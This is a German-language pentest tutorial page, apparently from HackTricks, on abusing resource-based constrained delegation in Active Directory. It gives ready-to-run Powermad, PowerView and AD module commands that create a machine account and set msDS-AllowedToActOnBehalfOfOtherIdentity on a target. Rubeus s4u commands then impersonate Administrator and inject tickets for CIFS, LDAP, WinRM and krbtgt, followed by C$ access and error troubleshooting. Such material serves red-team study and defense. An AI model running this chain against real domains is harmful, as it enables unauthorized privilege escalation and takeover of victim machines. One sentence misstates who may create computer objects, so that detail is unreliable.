# Ressourcenbasierte eingeschränkte Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der ressourcenbasierten eingeschränkten Delegation

Dies ist ähnlich wie die grundlegende [Eingeschränkte Delegation](constrained-delegation.md), aber **anstatt** Berechtigungen für ein **Objekt** zu erteilen, um **irgendeinen Benutzer gegen einen Dienst zu impersonieren**. Die ressourcenbasierte eingeschränkte Delegation **legt** im **Objekt fest, wer in der Lage ist, irgendeinen Benutzer gegen es zu impersonieren**.

In diesem Fall hat das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers, der jeden anderen Benutzer gegen es impersonieren kann.

Ein weiterer wichtiger Unterschied dieser eingeschränkten Delegation zu den anderen Delegationen ist, dass jeder Benutzer mit **Schreibberechtigungen über ein Maschinenkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann (In den anderen Formen der Delegation benötigten Sie Domain-Admin-Rechte).

### Neue Konzepte

Bei der eingeschränkten Delegation wurde gesagt, dass die **`TrustedToAuthForDelegation`**-Flagge im _userAccountControl_-Wert des Benutzers erforderlich ist, um eine **S4U2Self**-Anfrage durchzuführen. Aber das ist nicht ganz richtig.\
Die Realität ist, dass Sie auch ohne diesen Wert eine **S4U2Self**-Anfrage gegen jeden Benutzer durchführen können, wenn Sie ein **Dienst** (einen SPN haben) sind, aber wenn Sie **`TrustedToAuthForDelegation`** haben, wird das zurückgegebene TGS **Forwardable** sein, und wenn Sie **diese Flagge nicht haben**, wird das zurückgegebene TGS **nicht** **Forwardable** sein.

Wenn das **TGS**, das in **S4U2Proxy** verwendet wird, **NICHT Forwardable** ist, wird der Versuch, eine **grundlegende eingeschränkte Delegation** auszunutzen, **nicht funktionieren**. Aber wenn Sie versuchen, eine **ressourcenbasierte eingeschränkte Delegation auszunutzen, wird es funktionieren** (das ist keine Schwachstelle, es ist eine Funktion, anscheinend).

### Angriffsstruktur

> Wenn Sie **Schreibäquivalente Berechtigungen** über ein **Computer**-Konto haben, können Sie **privilegierten Zugriff** auf diese Maschine erhalten.

Angenommen, der Angreifer hat bereits **schreibäquivalente Berechtigungen über den Computer des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto, das einen **SPN** hat oder **erstellt einen** (“Service A”). Beachten Sie, dass **jeder** _Admin-Benutzer_ ohne andere spezielle Berechtigungen bis zu 10 **Computerobjekte** (**_**MachineAccountQuota**_**) **erstellen** und ihnen einen **SPN** zuweisen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und einen SPN festlegen.
2. Der Angreifer **missbraucht seine SCHREIBBERECHTIGUNG** über den Computer des Opfers (ServiceB), um die **ressourcenbasierte eingeschränkte Delegation zu konfigurieren, die es ServiceA ermöglicht, jeden Benutzer** gegen diesen Computer des Opfers (ServiceB) zu impersonieren.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten SPN-Konto): Fordern Sie ein **TGS von Administrator an** (Nicht Forwardable).
2. S4U2Proxy: Verwenden Sie das **nicht Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** von **Administrator** zum **Opferhost** anzufordern.
3. Selbst wenn Sie ein nicht Forwardable TGS verwenden, wird es funktionieren, da Sie die ressourcenbasierte eingeschränkte Delegation ausnutzen.
4. Der Angreifer kann das **Ticket weitergeben** und den Benutzer **impersonieren**, um **Zugriff auf den Opfer-ServiceB** zu erhalten.

Um das _**MachineAccountQuota**_ der Domäne zu überprüfen, können Sie Folgendes verwenden:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können ein Computerobjekt innerhalb der Domäne mit [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren von R**essourcenbasiertem Eingeschränkten Delegieren**

**Verwendung des Active Directory PowerShell-Moduls**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Verwendung von powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U-Angriffs

Zuerst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies wird die RC4- und AES-Hashes für dieses Konto drucken.\
Jetzt kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können mehr Tickets generieren, indem Sie einfach einmal mit dem Parameter `/altservice` von Rubeus fragen:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Beachten Sie, dass Benutzer ein Attribut namens "**Kann nicht delegiert werden**" haben. Wenn ein Benutzer dieses Attribut auf Wahr hat, können Sie ihn nicht impersonieren. Dieses Attribut kann in BloodHound gesehen werden.

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff aus und injiziert das TGS** vom Administrator in den Opfer-Host in **Speicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst vom Administrator angefordert, sodass Sie auf **C$** zugreifen können:
```bash
ls \\victim.domain.local\C$
```
### Missbrauch verschiedener Diensttickets

Erfahren Sie mehr über die [**verfügbaren Diensttickets hier**](silver-ticket.md#available-services).

## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Dies bedeutet, dass Kerberos so konfiguriert ist, dass es DES oder RC4 nicht verwendet, und Sie nur den RC4-Hash bereitstellen. Stellen Sie Rubeus mindestens den AES256-Hash zur Verfügung (oder geben Sie ihm einfach die rc4-, aes128- und aes256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Dies bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos nicht richtig funktioniert.
- **`preauth_failed`**: Dies bedeutet, dass der angegebene Benutzername + Hashes nicht funktionieren, um sich anzumelden. Möglicherweise haben Sie vergessen, das "$" im Benutzernamen anzugeben, als Sie die Hashes generiert haben (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Dies kann bedeuten:
  - Der Benutzer, den Sie zu impersonieren versuchen, kann nicht auf den gewünschten Dienst zugreifen (weil Sie ihn nicht impersonieren können oder weil er nicht über ausreichende Berechtigungen verfügt)
  - Der angeforderte Dienst existiert nicht (wenn Sie um ein Ticket für winrm bitten, aber winrm nicht läuft)
  - Der erstellte Fakecomputer hat seine Berechtigungen über den verwundbaren Server verloren und Sie müssen sie zurückgeben.

## Referenzen

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

{{#include ../../banners/hacktricks-training.md}}
